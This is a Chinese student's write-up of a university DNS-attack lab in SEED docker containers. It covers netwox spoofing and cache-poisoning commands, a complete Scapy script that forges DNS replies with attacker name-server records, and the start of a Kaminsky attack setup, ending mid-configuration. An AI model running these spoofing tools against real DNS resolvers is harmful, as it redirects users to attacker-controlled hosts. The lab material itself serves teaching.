---
layout: post
title: "HUST网安计算机网络安全实验实验二-DNS协议漏洞利用实验"
date: 2022-04-21 23:16:19 +0800
description: "Kaminsky代码已给出。_hust计算机网络安全实验"
keywords: "hust计算机网络安全实验"
categories: ['Hust']
tags: ['计网安全', 'Scapy', 'Netwox', 'Dns']
artid: "124334364"
image:
    path: https://api.vvhan.com/api/bing?rand=sj&artid=124334364
    alt: "HUST网安计算机网络安全实验实验二-DNS协议漏洞利用实验"
render_with_liquid: false
---

<div class="blog-content-box">
 <div class="article-header-box">
  <div class="article-header">
   <div class="article-title-box">
    <h1 class="title-article" id="articleContentId">
     【HUST】网安｜计算机网络安全实验｜实验二 DNS协议漏洞利用实验
    </h1>
   </div>
  </div>
 </div>
 <article class="baidu_pl">
  <div class="article_content clearfix" id="article_content">
   <link href="../../assets/css/kdoc_html_views-1a98987dfd.css" rel="stylesheet"/>
   <link href="../../assets/css/ck_htmledit_views-704d5b9767.css" rel="stylesheet"/>
   <div class="markdown_views prism-tomorrow-night-eighties" id="content_views">
    <svg style="display: none;" xmlns="http://www.w3.org/2000/svg">
     <path d="M5,0 0,2.5 5,5z" id="raphael-marker-block" stroke-linecap="round" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);">
     </path>
    </svg>
    <p>
     写在最前：
     <br/>
     这是我个人的实验记录，实现方式有很多种，多台虚拟机更容易做netwox。
     <br/>
     认真整理和记录了一下容易出问题的地方。
     <br/>
     代码仓库开了。
     <br/>
    </p>
    <div class="toc">
     <h4>
      文章目录
     </h4>
     <ul>
      <li>
       <a href="#_5" rel="nofollow">
        涉及代码的仓库地址
       </a>
      </li>
      <li>
       <a href="#_8" rel="nofollow">
        计算机网络安全实验二
       </a>
      </li>
      <li>
       <ul>
        <li>
         <a href="#DNS_10" rel="nofollow">
          DNS协议漏洞利用实验
         </a>
        </li>
        <li>
         <ul>
          <li>
           <a href="#docker_12" rel="nofollow">
            docker使用
           </a>
          </li>
          <li>
           <ul>
            <li>
             <a href="#_14" rel="nofollow">
              建立实验环境
             </a>
            </li>
            <li>
             <a href="#docker_52" rel="nofollow">
              docker常用指令
             </a>
            </li>
           </ul>
          </li>
          <li>
           <a href="#_85" rel="nofollow">
            一些注意事项
           </a>
          </li>
          <li>
           <a href="#_DNS__97" rel="nofollow">
            设置本地 DNS 服务器
           </a>
          </li>
          <li>
           <ul>
            <li>
             <a href="#_99" rel="nofollow">
              配置用户计算机
             </a>
            </li>
            <li>
             <a href="#DNS_111" rel="nofollow">
              设置本地DNS服务器
             </a>
            </li>
            <li>
             <a href="#_DNS__151" rel="nofollow">
              在本地 DNS 服务器中建一个区域
             </a>
            </li>
           </ul>
          </li>
          <li>
           <a href="#_197" rel="nofollow">
            修改主机文件（可略）
           </a>
          </li>
          <li>
           <a href="#netwoxDNS_229" rel="nofollow">
            netwox实施DNS的用户响应欺骗攻击
           </a>
          </li>
          <li>
           <a href="#netwoxDNS_260" rel="nofollow">
            netwox实施DNS的缓存中毒攻击
           </a>
          </li>
          <li>
           <a href="#scapyDNS_325" rel="nofollow">
            scapy实施DNS缓存中毒攻击
           </a>
          </li>
          <li>
           <a href="#_DNS_Kaminsky_402" rel="nofollow">
            远程 DNS 缓存中毒攻击-Kaminsky
           </a>
          </li>
          <li>
           <ul>
            <li>
             <a href="#_404" rel="nofollow">
              实验环境配置
             </a>
            </li>
            <li>
             <a href="#_490" rel="nofollow">
              攻击原理
             </a>
            </li>
            <li>
             <a href="#_500" rel="nofollow">
              攻击过程
             </a>
            </li>
           </ul>
          </li>
         </ul>
        </li>
       </ul>
      </li>
     </ul>
    </div>
    <p>
    </p>
    <h2>
     <a id="_5">
     </a>
     涉及代码的仓库地址
    </h2>
    <p>
     <a href="https://gitee.com/shandianchengzi/cse_networksecurity_exp/tree/master/2_DNS%E6%94%BB%E5%87%BB%E5%AE%9E%E9%AA%8C" rel="nofollow">
      HUST计算机网络安全实验_Gitee
     </a>
     <br/>
     <a href="https://github.com/shandianchengzi/cse_networksecurity_exp">
      Github
     </a>
    </p>
    <h2>
     <a id="_8">
     </a>
     计算机网络安全实验二
    </h2>
    <h3>
     <a id="DNS_10">
     </a>
     DNS协议漏洞利用实验
    </h3>
    <h4>
     <a id="docker_12">
     </a>
     docker使用
    </h4>
    <h5>
     <a id="_14">
     </a>
     建立实验环境
    </h5>
    <p>
     普通用户： seed 密码:dees
     <br/>
     超级用户：root 密码：seedubuntu
    </p>
    <p>
     Network(bridge)：10.10.10.0/24：
    </p>
    <pre><code class="prism language-bash"><span class="token function">sudo</span> <span class="token function">docker</span> network create --subnet<span class="token operator">=</span><span class="token number">10.10</span>.10.0/24 dnsnetwork
</code></pre>
    <p>
     创建dns(注意创建docker的时候不要写privileged)：
    </p>
    <pre><code class="prism language-bash"><span class="token function">sudo</span> <span class="token function">docker</span> run -it --name<span class="token operator">=</span>dns --hostname<span class="token operator">=</span>dns --net dnsnetwork --ip<span class="token operator">=</span><span class="token number">10.10</span>.10.2 <span class="token string">"seedubuntu"</span> /bin/bash
</code></pre>
    <p>
     创建user：
    </p>
    <pre><code class="prism language-bash"><span class="token function">sudo</span> <span class="token function">docker</span> run -it --name<span class="token operator">=</span>user --hostname<span class="token operator">=</span>user --net dnsnetwork --ip<span class="token operator">=</span><span class="token number">10.10</span>.10.3 <span class="token string">"seedubuntu"</span> /bin/bash
</code></pre>
    <p>
     创建dns：
    </p>
    <pre><code class="prism language-bash"><span class="token function">sudo</span> <span class="token function">docker</span> run -it --name<span class="token operator">=</span>dns --hostname<span class="token operator">=</span>dns --net dnsnetwork --ip<span class="token operator">=</span><span class="token number">10.10</span>.10.2 <span class="token string">"seedubuntu"</span> /bin/bash
</code></pre>
    <p>
     我的ip：
    </p>
    <pre><code class="prism language-bash">Attacker：10.10.10.1
dns：10.10.10.2
user：10.10.10.3
网卡：br-29c63b220f5a
</code></pre>
    <h5>
     <a id="docker_52">
     </a>
     docker常用指令
    </h5>
    <p>
     打开或停止HostM：
    </p>
    <pre><code class="prism language-bash"><span class="token function">sudo</span> <span class="token function">docker</span> start/stop HostM
</code></pre>
    <p>
     把HostM映射到bash中：
    </p>
    <pre><code class="prism language-bash"><span class="token function">sudo</span> <span class="token function">docker</span> <span class="token builtin class-name">exec</span> -it HostM /bin/bash
</code></pre>
    <p>
     查看当前docker有哪些：
    </p>
    <pre><code class="prism language-bash"><span class="token function">sudo</span> <span class="token function">docker</span> <span class="token function">ps</span> -a
</code></pre>
    <p>
     关闭防火墙：
    </p>
    <pre><code class="prism language-bash"><span class="token function">sudo</span> iptables -F
</code></pre>
    <p>
     主机和容器之间拷贝数据：
    </p>
    <pre><code class="prism language-bash"><span class="token function">sudo</span> <span class="token function">docker</span> <span class="token function">cp</span> 容器名称:路径 主机路径
<span class="token function">sudo</span> <span class="token function">docker</span> <span class="token function">cp</span> 主机路径 容器名称:路径
</code></pre>
    <h4>
     <a id="_85">
     </a>
     一些注意事项
    </h4>
    <ol>
     <li>
      每次重启之后，
      <code>
       /etc/resolv.conf
      </code>
      会被改成原来的内容。
     </li>
     <li>
      修改BIND9的配置后，可以运行
      <code>
       sudo rndc flush
      </code>
      测试一下。当遇到
      <code>
       rndc: connect failed: 127.0.0.1#953: connection refused
      </code>
      报错时，先试着重启BIND9服务，再找找bind9的配置项是否出错，改回默认配置，把错误纠正。如果不是配置问题，就运行
      <code>
       sudo named -d 3 -f -g
      </code>
      检查错误信息。注意，named指令会导致DNS缓存一直无条目，不要在做后面的实验时用。
     </li>
     <li>
      配置项相关文件的权限最好都设置成可读可写，还有
      <code>
       /etc/bind/rndc.key
      </code>
      。
     </li>
     <li>
      DNS服务器中出现不想要的缓存的时候，可以用
      <code>
       rndc flushname xxx.com
      </code>
      清除。免得等半天。
     </li>
     <li>
      DNS远程攻击的时候，如果修改了攻击机上的配置，最好是把DNS服务器的缓存清空，然后两个机子的BIND9服务都重启，否则DNS缓存刷新不及时，妨碍后续攻击。具体咋回事多
      <code>
       dumpdb
      </code>
      看看DNS缓存就行。
     </li>
     <li>
      服务器返回icmp报文说端口不可达，原因可能是服务器的bind9未启动，服务器运行
      <code>
       service bind9 start
      </code>
      。
     </li>
     <li>
      如果碰到下图这种解析成UDP包的，不要慌！只是Wireshark显示异常，仅此而已，你去服务器里边dumpdb一点问题没有！
      <br/>
      <img alt="在这里插入图片描述" src="https://i-blog.csdnimg.cn/blog_migrate/a13f7ea6fb7f39dd3c2fad7929ea5817.png"/>
     </li>
    </ol>
    <div>
    </div>
    <h4>
     <a id="_DNS__97">
     </a>
     设置本地 DNS 服务器
    </h4>
    <h5>
     <a id="_99">
     </a>
     配置用户计算机
    </h5>
    <p>
     修改user主机的
     <code>
      /etc/resolv.conf
     </code>
     文件，将服务器IP添加 为文件中的第一个 nameserver 条目，即此服务器将用作主 DNS 服务器，如下图所示：
    </p>
    <p>
     <img alt="" src="https://i-blog.csdnimg.cn/blog_migrate/6facb200112abff08b24059ac4deb69f.png"/>
    </p>
    <p>
     完成配置用户计算机之后，使用 dig 命令获取任意网址的 IP 地址，可以看到回应来自于10.10.10.2。 如下图：
    </p>
    <p>
     <img alt="" src="https://i-blog.csdnimg.cn/blog_migrate/923b4cf6b3405c6fb080c48d50275cc9.png"/>
    </p>
    <p>
     即user的配置成功。
    </p>
    <h5>
     <a id="DNS_111">
     </a>
     设置本地DNS服务器
    </h5>
    <p>
     编辑
     <code>
      /etc/bind/named.conf.options
     </code>
     ：确认①
     <code>
      dump-file "/var/cache/bind/dump.db";
     </code>
     ；②dnssec-validation auto被注释，dnssec-enable是no(关闭DNSSEC)；③端口号设置好。如下图所示，打开的时候已经配置好了：
    </p>
    <p>
     <img alt="在这里插入图片描述" src="https://i-blog.csdnimg.cn/blog_migrate/56a9ae2dfa86ccfccffa0266c197bc88.png"/>
    </p>
    <p>
     重启DNS服务器：
    </p>
    <pre><code class="prism language-bash"><span class="token function">sudo</span> <span class="token function">service</span> bind9 restart
</code></pre>
    <p>
     然后再运行提权指令减少一些报错：
    </p>
    <pre><code class="prism language-bash"><span class="token function">sudo</span> <span class="token function">chmod</span> <span class="token number">777</span> /var/cache/bind/dump.db <span class="token comment"># 提高缓存文件的权限</span>
<span class="token function">sudo</span> <span class="token function">chmod</span> <span class="token number">777</span> /etc/bind/rndc.key <span class="token comment"># 提高rndc的权限</span>
</code></pre>
    <p>
     服务器常用指令：
    </p>
    <pre><code class="prism language-bash"><span class="token function">sudo</span> rndc dumpdb -cache <span class="token comment"># 将缓存转储到特定文件</span>
<span class="token function">sudo</span> rndc flush <span class="token comment"># 清除DNS缓存</span>
</code></pre>
    <p>
     在用户机上运行ping指令测试：
    </p>
    <pre><code class="prism language-bash"><span class="token function">ping</span> www.baidu.com
</code></pre>
    <p>
     在Wireshark上查看ping命令触发的DNS查询。
    </p>
    <p>
     <img alt="" src="https://i-blog.csdnimg.cn/blog_migrate/c1f290b4c52831131bd68abf4188ea72.png"/>
    </p>
    <p>
     前期发送了大量的DNS查询报文，递归查询。（对应蓝色部分）
     <br/>
     当ping通之后，不需要再进行DNS查询，因此直接从缓存中读取IP地址。（对应的是连续的粉红色部分）
    </p>
    <h5>
     <a id="_DNS__151">
     </a>
     在本地 DNS 服务器中建一个区域
    </h5>
    <ol>
     <li>
      <p>
       创建区域：在dns中编辑
       <code>
        /etc/bind/named.conf.default-zones
       </code>
       ，添加：
      </p>
      <pre><code class="prism language-bash">zone <span class="token string">"example.com"</span> <span class="token punctuation">{<!-- --></span>
     <span class="token builtin class-name">type</span> master<span class="token punctuation">;</span>
     <span class="token function">file</span> <span class="token string">"/etc/bind/example.com.db"</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>
zone <span class="token string">"0.168.192.in-addr.arpa"</span> <span class="token punctuation">{<!-- --></span>
     <span class="token builtin class-name">type</span> master<span class="token punctuation">;</span>
     <span class="token function">file</span> <span class="token string">"/etc/bind/192.168.0.db"</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>
</code></pre>
     </li>
     <li>
      <p>
       把文件从主机中移动到docker中：
      </p>
      <pre><code class="prism language-bash"><span class="token function">sudo</span> <span class="token function">docker</span> <span class="token function">cp</span> <span class="token number">192.168</span>.0.db dns:/etc/bind/ <span class="token comment"># 正向查找区域文件</span>
<span class="token function">sudo</span> <span class="token function">docker</span> <span class="token function">cp</span> example.com.db dns:/etc/bind/ <span class="token comment"># 反向查找区域文件</span>
</code></pre>
     </li>
     <li>
      <p>
       重新启动BIND服务器：
      </p>
      <pre><code class="prism language-bash"><span class="token function">sudo</span> <span class="token function">service</span> bind9 restart
</code></pre>
      <p>
       <img alt="" src="https://i-blog.csdnimg.cn/blog_migrate/34521d276ede087931ca0ccf0395b22e.png"/>
      </p>
     </li>
     <li>
      <p>
       用户机运行
       <code>
        dig www.example.com
       </code>
       进行测试授权域配置：
      </p>
      <p>
       <img alt="" src="https://i-blog.csdnimg.cn/blog_migrate/84d83dd937751c5e447ab0b5dcec68a8.png"/>
      </p>
      <p>
       观察IP地址，与设置的一样。
      </p>
     </li>
     <li>
      <p>
       用户机运行
       <code>
        dig www.baidu.com
       </code>
       进行测试非授权域配置：
      </p>
      <p>
       <img alt="" src="https://i-blog.csdnimg.cn/blog_migrate/b151b99b8b398cec33990fc5344c7d3c.png"/>
      </p>
      <p>
       对于非授权域域名，也能够成功获得相应信息。
      </p>
      <p>
       实验环境配置完成。
      </p>
     </li>
    </ol>
    <div>
    </div>
    <h4>
     <a id="_197">
     </a>
     修改主机文件（可略）
    </h4>
    <p>
     修改/etc/hosts文件，添加：
    </p>
    <pre><code class="prism language-bash"><span class="token number">1.2</span>.3.4 www.bank32.com
</code></pre>
    <p>
     用dig命令测试结果，发现修改主机文件确实不影响对www.bank32.com文件解析，如下图所示：
    </p>
    <p>
     <img alt="在这里插入图片描述" src="https://i-blog.csdnimg.cn/blog_migrate/1729913b149ed6e579928630060b6485.png"/>
    </p>
    <p>
     用ping命令测试修改结果，确实影响了，如下图所示：
    </p>
    <p>
     <img alt="" src="https://i-blog.csdnimg.cn/blog_migrate/dc01de159faf5af6fbb4edd1a8b4e331.png"/>
    </p>
    <p>
     用Web浏览器测试结果，这个需要到seed@VM中检验。因此把seed@VM的/etc/hosts也修改一下，测试结果如下。
    </p>
    <p>
     <img alt="" src="https://i-blog.csdnimg.cn/blog_migrate/caa56e6d1e61c0069f867f5d9f7cc4ce.png"/>
    </p>
    <p>
     如上图所示，解析的DesIP被修改成1.2.3.4。
    </p>
    <div>
    </div>
    <p>
     netwox可参考：
     <a href="https://www.cnblogs.com/wsine/p/5657163.html" rel="nofollow">
      DNS攻击 - Wsine - 博客园 (cnblogs.com)
     </a>
     ，基本上就是实验内容。
    </p>
    <div>
    </div>
    <h4>
     <a id="netwoxDNS_229">
     </a>
     netwox实施DNS的用户响应欺骗攻击
    </h4>
    <p>
     攻击指令：
    </p>
    <pre><code class="prism language-bash"><span class="token function">sudo</span> netwox <span class="token number">105</span> -h <span class="token string">"news.youtube.com"</span> -H <span class="token string">"101.102.103.104"</span> -a <span class="token string">"ns.youtube.com"</span> -A <span class="token string">"55.66.77.88"</span> --filter <span class="token string">"src host 10.10.10.3"</span> --device <span class="token string">"br-29c63b220f5a"</span>
</code></pre>
    <p>
     攻击的是user，注意一定要加上–device 网卡，否则filter参数会失效。
    </p>
    <p>
     运行攻击指令，并在用户机上
     <code>
      dig news.youtube.com
     </code>
     触发。
    </p>
    <p>
     在攻击机上可以看到伪造的响应：
    </p>
    <p>
     <img alt="" src="https://i-blog.csdnimg.cn/blog_migrate/19987afd48882d70e7c7c0dcac8e85ca.png"/>
    </p>
    <p>
     在user上查看回应，与伪造的一致：
    </p>
    <p>
     <img alt="" src="https://i-blog.csdnimg.cn/blog_migrate/77f678b3601e2fc1e8a32758cd9077a0.png"/>
    </p>
    <p>
     观察到得到错误的DNS返回，并且显示为指定的IP地址，也返回了查询网址的权威域名及其IP地址。结果符合预期，攻击成功。
    </p>
    <p>
     令攻击机停止攻击，再次
     <code>
      dig news.youtube.com
     </code>
     ，在user上显示：
    </p>
    <p>
     <img alt="" src="https://i-blog.csdnimg.cn/blog_migrate/229de434dcfdfd852380ee8dc2324864.png"/>
    </p>
    <p>
     此时返回的结果与真实结果一致。
     <br/>
     说明攻击的确实是DNS的用户响应，不影响DNS服务器的正常请求。
    </p>
    <div>
    </div>
    <h4>
     <a id="netwoxDNS_260">
     </a>
     netwox实施DNS的缓存中毒攻击
    </h4>
    <p>
     在攻击机上运行：
    </p>
    <pre><code class="prism language-bash"><span class="token function">sudo</span> netwox <span class="token number">105</span> -h <span class="token string">"news.youtube.com"</span> -H <span class="token string">"101.102.103.104"</span> -a <span class="token string">"ns.youtube.com"</span> -A <span class="token string">"55.66.77.88"</span> --filter <span class="token string">"src host 10.10.10.2"</span> --device <span class="token string">"br-29c63b220f5a"</span> --spoofip <span class="token string">"raw"</span> --ttl <span class="token number">600</span>
</code></pre>
    <p>
     意思是设置DNS响应包域名news.youtube.com对应IP地址为101.102.103.104，权威名称服务器ns.youtube.com对应的IP地址为55.66.77.88。
    </p>
    <p>
     攻击的是DNS服务器的缓存，ttl生存时间代表缓存留存在DNS服务器上的时间600（秒）。spoofip参数选择raw，否则netwox将对被欺骗的IP地址也进行MAC地址欺骗，因为ARP查询响应的等待时间问题，实验有可能失败。
    </p>
    <blockquote>
     <p>
      实际上，就算加了参数，在docker上做实验，但是在三台虚拟主机上做实验就必成功（亲测），还是有
      <strong>
       很大的可能失败
      </strong>
      。
     </p>
     <p>
      以下是难得成功的一次截图。
     </p>
    </blockquote>
    <ol>
     <li>
      <p>
       首先清空DNS缓存：
      </p>
      <pre><code class="prism language-bash"><span class="token function">sudo</span> rndc flush
</code></pre>
     </li>
     <li>
      <p>
       为了提高攻击的成功率，添加对外访问的时延如下（其实就是DNS服务器对外访问慢一点，保证它优先收到攻击机的回应）：
      </p>
      <pre><code class="prism language-bash"><span class="token function">sudo</span> tc qdisc <span class="token function">add</span> dev br-29c63b220f5a root netem delay 1s
</code></pre>
     </li>
     <li>
      <p>
       运行攻击命令，用
       <code>
        dig news.youtube.com
       </code>
       触发：
      </p>
      <p>
       <img alt="" src="https://i-blog.csdnimg.cn/blog_migrate/5c76fea54080ad810f23a0773a422109.png"/>
      </p>
      <p>
       观察到，攻击机成功嗅探到DNS服务器向上发出的DNS请求包，并伪造上层DNS服务器向其发送回复报文。
      </p>
      <p>
       在user上dig指令的结果：
      </p>
      <p>
       <img alt="" src="https://i-blog.csdnimg.cn/blog_migrate/a3c3060a9baa8c52a19cb066e227065a.png"/>
      </p>
      <p>
       观察到IP地址、权威域名服务器地址被修改成期望的地址。
      </p>
      <p>
       同时用Wireshark抓包，得到如下结果：
      </p>
      <p>
       <img alt="" src="https://i-blog.csdnimg.cn/blog_migrate/0f4ff1d8cba69e513127b15b09507bdb.png"/>
      </p>
      <p>
       观察到，攻击机比真实DNS服务器提前一步发送DNS响应，从而导致DNS缓存中毒。
      </p>
      <p>
       转储并查看DNS服务器缓存，如下：
      </p>
      <pre><code class="prism language-bash"><span class="token function">sudo</span> rndc dumpdb -cache
<span class="token function">sudo</span> <span class="token function">cat</span> /var/cache/bind/dump.db <span class="token operator">|</span> <span class="token function">grep</span> -E <span class="token string">"google|youtube|example|attack"</span>
</code></pre>
      <p>
       <img alt="" src="https://i-blog.csdnimg.cn/blog_migrate/6400f912fb1cf7e954fc49b5ed1b4a6f.png"/>
      </p>
     </li>
     <li>
      <p>
       停止攻击后，再次用dig进行域名查询，观察到返回的结果与上述结果一致：
      </p>
      <p>
       <img alt="" src="https://i-blog.csdnimg.cn/blog_migrate/0a1b0b4249dfac14e467d7ee976f8776.png"/>
      </p>
      <p>
       可以通过时间、TTL来判断，确实是攻击前后发的两次不同的查询。
      </p>
     </li>
    </ol>
    <p>
     DNS缓存中毒成功。
    </p>
    <div>
    </div>
    <h4>
     <a id="scapyDNS_325">
     </a>
     scapy实施DNS缓存中毒攻击
    </h4>
    <p>
     针对授权域Authority Section和附加域Additional Section的攻击脚本：
    </p>
    <p>
     该脚本既将授权域改成了attacker32.com，也将附加域修改了。
    </p>
    <pre><code class="prism language-bash">from scapy.all <span class="token function">import</span> *

def spoof_dns<span class="token punctuation">(</span>pkt<span class="token punctuation">)</span>:
  <span class="token comment">#pkt.show()</span>
  if<span class="token punctuation">(</span>DNS <span class="token keyword">in</span> pkt and <span class="token string">'www.example.net'</span> <span class="token keyword">in</span> pkt<span class="token punctuation">[</span>DNS<span class="token punctuation">]</span>.qd.qname<span class="token punctuation">)</span>:
    IPpkt <span class="token operator">=</span> IP<span class="token punctuation">(</span>dst<span class="token operator">=</span>pkt<span class="token punctuation">[</span>IP<span class="token punctuation">]</span>.src, <span class="token assign-left variable">src</span><span class="token operator">=</span>pkt<span class="token punctuation">[</span>IP<span class="token punctuation">]</span>.dst<span class="token punctuation">)</span>

    UDPpkt <span class="token operator">=</span> UDP<span class="token punctuation">(</span>dport<span class="token operator">=</span>pkt<span class="token punctuation">[</span>UDP<span class="token punctuation">]</span>.sport, <span class="token assign-left variable">sport</span><span class="token operator">=</span><span class="token number">53</span><span class="token punctuation">)</span>

    <span class="token comment"># The Answer Section</span>
    Anssec <span class="token operator">=</span> DNSRR<span class="token punctuation">(</span>rrname<span class="token operator">=</span>pkt<span class="token punctuation">[</span>DNS<span class="token punctuation">]</span>.qd.qname, <span class="token assign-left variable">type</span><span class="token operator">=</span><span class="token string">'A'</span>,ttl<span class="token operator">=</span><span class="token number">259200</span>, <span class="token assign-left variable">rdata</span><span class="token operator">=</span><span class="token string">'10.0.2.5'</span><span class="token punctuation">)</span>

    <span class="token comment"># The Authority Section</span>
    NSsec1 <span class="token operator">=</span> DNSRR<span class="token punctuation">(</span>rrname<span class="token operator">=</span><span class="token string">'example.net'</span>, <span class="token assign-left variable">type</span><span class="token operator">=</span><span class="token string">'NS'</span>, <span class="token assign-left variable">ttl</span><span class="token operator">=</span><span class="token number">259200</span>, <span class="token assign-left variable">rdata</span><span class="token operator">=</span><span class="token string">'attacker32.com'</span><span class="token punctuation">)</span>
    NSsec2 <span class="token operator">=</span> DNSRR<span class="token punctuation">(</span>rrname<span class="token operator">=</span><span class="token string">'google.com'</span>, <span class="token assign-left variable">type</span><span class="token operator">=</span><span class="token string">'NS'</span>, <span class="token assign-left variable">ttl</span><span class="token operator">=</span><span class="token number">259200</span>, <span class="token assign-left variable">rdata</span><span class="token operator">=</span><span class="token string">'attacker32.com'</span><span class="token punctuation">)</span>

    <span class="token comment"># The Additional Section</span>
    Addsec1 <span class="token operator">=</span> DNSRR<span class="token punctuation">(</span>rrname<span class="token operator">=</span><span class="token string">'attacker32.com'</span>, <span class="token assign-left variable">type</span><span class="token operator">=</span><span class="token string">'A'</span>, <span class="token assign-left variable">ttl</span><span class="token operator">=</span><span class="token number">259200</span>, <span class="token assign-left variable">rdata</span><span class="token operator">=</span><span class="token string">'1.2.3.4'</span><span class="token punctuation">)</span>
    Addsec2 <span class="token operator">=</span> DNSRR<span class="token punctuation">(</span>rrname<span class="token operator">=</span><span class="token string">'attacker32.cn'</span>, <span class="token assign-left variable">type</span><span class="token operator">=</span><span class="token string">'A'</span>, <span class="token assign-left variable">ttl</span><span class="token operator">=</span><span class="token number">259200</span>, <span class="token assign-left variable">rdata</span><span class="token operator">=</span><span class="token string">'5.6.7.8'</span><span class="token punctuation">)</span>

    <span class="token comment"># Construct the DNS packet</span>
    DNSpkt <span class="token operator">=</span> DNS<span class="token punctuation">(</span>id<span class="token operator">=</span>pkt<span class="token punctuation">[</span>DNS<span class="token punctuation">]</span>.id, <span class="token assign-left variable">qd</span><span class="token operator">=</span>pkt<span class="token punctuation">[</span>DNS<span class="token punctuation">]</span>.qd, <span class="token assign-left variable">aa</span><span class="token operator">=</span><span class="token number">1</span>, <span class="token assign-left variable">rd</span><span class="token operator">=</span><span class="token number">0</span>, <span class="token assign-left variable">qr</span><span class="token operator">=</span><span class="token number">1</span>, <span class="token assign-left variable">qdcount</span><span class="token operator">=</span><span class="token number">1</span>, <span class="token assign-left variable">ancount</span><span class="token operator">=</span><span class="token number">1</span>, <span class="token assign-left variable">nscount</span><span class="token operator">=</span><span class="token number">2</span>, <span class="token assign-left variable">arcount</span><span class="token operator">=</span><span class="token number">2</span>, <span class="token assign-left variable">an</span><span class="token operator">=</span>Anssec, <span class="token assign-left variable">ns</span><span class="token operator">=</span>NSsec1/NSsec2, <span class="token assign-left variable">ar</span><span class="token operator">=</span>Addsec1/Addsec2<span class="token punctuation">)</span>

    <span class="token comment"># Construct the entire IP packet and send it out</span>
    spoofpkt <span class="token operator">=</span> IPpkt/UDPpkt/DNSpkt
    send<span class="token punctuation">(</span>spoofpkt<span class="token punctuation">)</span>

<span class="token comment"># Sniff UDP query packets and invoke spoof_dns().</span>
pkt <span class="token operator">=</span> sniff<span class="token punctuation">(</span>filter<span class="token operator">=</span><span class="token string">'udp and dst port 53 and src host 10.10.10.2'</span>, <span class="token assign-left variable">prn</span><span class="token operator">=</span>spoof_dns<span class="token punctuation">)</span>
</code></pre>
    <ol>
     <li>
      <p>
       运行攻击脚本，在user上使用
       <code>
        dig www.example.net
       </code>
       命令激发DNS查询，攻击脚本运行如下图：
      </p>
      <p>
       <img alt="" src="https://i-blog.csdnimg.cn/blog_migrate/5071d53dc162a2a2e9b68ca46a5c4f66.png"/>
      </p>
     </li>
     <li>
      <p>
       user上返回结果如下图：
      </p>
      <p>
       <img alt="" src="https://i-blog.csdnimg.cn/blog_migrate/98fb91fde3a181d53b2c34a40e6d6b2b.png"/>
      </p>
      <p>
       与攻击脚本一致，授权域和附加域都被修改了。
      </p>
     </li>
     <li>
      <p>
       同时查看Wireshark的抓包结果，观察到发送的伪造报文：
      </p>
      <p>
       <img alt="" src="https://i-blog.csdnimg.cn/blog_migrate/6f15e5f21784fe4a17c37189ee8b24bb.png"/>
      </p>
     </li>
     <li>
      <p>
       转储并查看DNS服务器缓存，结果如下：
      </p>
      <p>
       <img alt="" src="https://i-blog.csdnimg.cn/blog_migrate/6e2950862202585c96b4cb406530a0d9.png"/>
      </p>
      <p>
       观察到，没有attacker32.cn的缓存记录，这是因为attacker32.cn没有出现在授权域中。
      </p>
     </li>
     <li>
      <p>
       停止攻击后，再次用dig进行域名查询，观察到返回的结果与上述结果一致：
      </p>
      <p>
       <img alt="" src="https://i-blog.csdnimg.cn/blog_migrate/00934b6b21d4bcef705cf058921793aa.png"/>
      </p>
      <p>
       可以通过时间、TTL来判断，确实是攻击前后发的两次不同的查询。
      </p>
      <p>
       DNS缓存中毒成功。
      </p>
     </li>
     <li>
      <p>
       此时使用
       <code>
        dig mail.example.net
       </code>
       命令进行查询，根据Wireshark抓包结果得知，当再次进行相同域的DNS查询时，会首先对在缓存中的NS条目指定的域名服务器进行查询，如下图：
      </p>
      <p>
       <img alt="" src="https://i-blog.csdnimg.cn/blog_migrate/c95131f1af60de1d853f79f669d15835.png"/>
      </p>
      <p>
       因此，对附加域的攻击也是成功的。
      </p>
     </li>
    </ol>
    <div>
    </div>
    <blockquote>
     <p>
      这是我参考过的博客(实验指导书其实已经写得很详细了)：
      <br/>
      主要参考：
      <a href="https://www.cnblogs.com/PsgQ/p/14601942.html#/c/subject/p/14601942.html" rel="nofollow">
       DNS 缓存中毒–Kaminsky 攻击复现
      </a>
      。
     </p>
    </blockquote>
    <h4>
     <a id="_DNS_Kaminsky_402">
     </a>
     远程 DNS 缓存中毒攻击-Kaminsky
    </h4>
    <h5>
     <a id="_404">
     </a>
     实验环境配置
    </h5>
    <ol>
     <li>
      <p>
       在dns中编辑
       <code>
        /etc/bind/named.conf.default-zones
       </code>
       ，注释掉之前配置的example.com区域。并添加假域名去展示实验效果：
      </p>
      <pre><code class="prism language-bash">zone <span class="token string">"ns.ssd.net"</span> <span class="token punctuation">{<!-- --></span>
     <span class="token builtin class-name">type</span> master<span class="token punctuation">;</span>
     <span class="token function">file</span> <span class="token string">"/etc/bind/ssd.net.db"</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>
</code></pre>
     </li>
     <li>
      <p>
       在dns中添加文件
       <code>
        /etc/bind/ssd.net.db
       </code>
       ，并将以下内容放入其中：
      </p>
      <pre><code class="prism language-bash"><span class="token variable">$TTL</span> <span class="token number">604800</span>
@ IN SOA localhost. root.localhost. <span class="token punctuation">(</span>
	<span class="token number">2</span> <span class="token punctuation">;</span> Serial
	<span class="token number">604800</span> <span class="token punctuation">;</span> Refresh
	<span class="token number">86400</span> <span class="token punctuation">;</span> Retry
	<span class="token number">2419200</span> <span class="token punctuation">;</span> Expire
	<span class="token number">604800</span> <span class="token punctuation">)</span> <span class="token punctuation">;</span> Negative Cache TTL
@ IN NS ns.ssd.net.
@ IN A <span class="token number">10.10</span>.10.1
ns IN A <span class="token number">10.10</span>.10.1
* IN A <span class="token number">10.10</span>.10.1
</code></pre>
      <p>
       其中
       <code>
        ns.ssd.net
       </code>
       修改成自己的假域名，
       <code>
        10.10.10.1
       </code>
       修改成攻击机的IP。
      </p>
     </li>
    </ol>
    <p>
     在用户机上运行
     <code>
      ping ns.ssd.net
     </code>
     测试是否配置成功：
    </p>
    <p>
     <img alt="" src="https://i-blog.csdnimg.cn/blog_migrate/e2f0191bdb2bba06883246a724a4ee71.png"/>
    </p>
    <p>
     如图，已经配置成功了。
    </p>
    <ol start="3">
     <li>
      <p>
       在攻击机中配置DNS服务器，去回答example.com的查询。在攻击机中编辑
       <code>
        /etc/bind/named.conf
       </code>
       添加以下内容：
      </p>
      <pre><code class="prism language-bash">zone <span class="token string">"example.com"</span> <span class="token punctuation">{<!-- --></span>
